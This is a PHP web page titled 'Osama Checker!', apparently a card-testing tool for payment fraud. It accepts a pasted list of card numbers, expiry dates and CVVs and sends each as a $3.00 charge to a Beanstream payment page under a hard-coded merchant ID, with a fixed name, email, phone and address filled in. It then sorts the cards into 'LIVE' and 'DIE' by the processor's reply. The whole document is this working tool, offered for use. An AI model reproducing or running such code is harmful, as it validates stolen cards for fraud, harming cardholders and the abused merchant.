
<form method="POST" action="">
    <center>
        Osama Checker!
        <p>Formato: 4984069626668526|462|02|2020</p> 
        <textarea name="list" rows="8" cols="70"></textarea><br>
        <input type="submit" value="checker">
        
        Criado Por Osama
    </center>
</form>
        <div class="panel panel-widget">
            <a href="#" class="hvr-shutter-out-horizontal">Shutter Out Horizontal</a>
        </div>

<?php

require_once './functions/_curl.php';

if (isset($_POST['list'])) {

    $lista = $_POST['list'];
    $line = explode("\r\n", $lista);
    $line = str_replace(array("\\\"", "\\'"), array("\"", "'"), $line);
    $line = str_replace("\r", "", $line);
    $line = str_replace("\n\n", "\n", $line);
    $line = array_unique($line);

    for ($i = 0; $i < count($line); $i++) {
        $line = str_replace(" ", "", $line);
        $line = str_replace("\r", "", $line);
        $line = str_replace("\n", "", $line);
        list($lista) = split(" ", $line[$i]);
        $l = explode("|", $lista);
        $num = $l[0];
        $mes = $l[1];
        $ano = $l[2];
        $cvv = $l[3];
        $data = $mes . +$ano;

        $link = "https://www.beanstream.com/scripts/payment/payment.asp?merchant_id=117587301";
        $post = "payFormParams=payment_type%3DPaymentForm%26merchant_id%3D117587301%26trnType%3DP%26errorPage%3D%252Fscripts%252Fpayment%252Fpayment%252Easp%26approvedPage%3D%26declinedPage%3D%26epe_client_found%3Dfalse%26trnLanguage%3Deng%26shipping_method%3D%26ref1%3D%26ref2%3D%26ref3%3D%26ref4%3D%26ref5%3D%26shippingMethod%3D%26deliveryEstimate%3D%26ordTax1Price%3D%26ordTax2Price%3D%26ordItemPrice%3D0%26ordShippingPrice%3D0%26trnOrderNumber%3D117587301%26trnAmount%3D3%252E00%26ordName%3DEdwin%2BMarin%26ordEmailAddress%3Dedw%252Dmarin%2540yahoo%252Eca%26ordPhoneNumber%3D%2528757%2529%2B642%252D7675%26ordAddress1%3D%2B2933%2BRed%2BDale%26ordCity%3DBuckingham%2B%2Bcircle%26ordProvince%3DVA%26ordPostalCode%3D24195%252D5432%26ordCountry%3DUS%26paymentMethod%3DCC%26trnCardOwner%3DEdwin%2BMarin%26trnCardCvd%3D$cvv%26cavBirthMonth%3D%26cavBirthDay%3D%26cavBirthYear%3D%26cavSin%3D%26paymentAction%3D%26trnCardNumber%3D$num%26trnExpMonth%3D$mes%26trnExpYear%3D$ano%26aDFinancingType%3D%26aDPlanNumber%3D%26aDGracePeriod%3D%26aDTerm%3D";
        $a = _curl($link, $post);
        //echo $a;

        if (stripos($a, 'Transaction Declined')) {
            $die .= $line[$i] . " => DIE\r";
        } elseif (stripos($a, 'Thank You!')) {
            $live .= $line[$i] . " => LIVE\r";
        } else {
            echo "Errrrooouu";
        }
    }
    echo "<center><img src='http://i.imgur.com/THWRXHe.jpg' style='height:50px;width:200px;'><br><font color=green><textarea name='live' rows='8' cols='70'>" . $live . "</textarea></font><br><img src='http://i.imgur.com/pzSfDWy.jpg' style='height:50px;width:200px;'><br><font color=red><textarea name='die' rows='8' cols='70'>" . $die . "</textarea></font><br></center>";
} else {
    
}
?> 

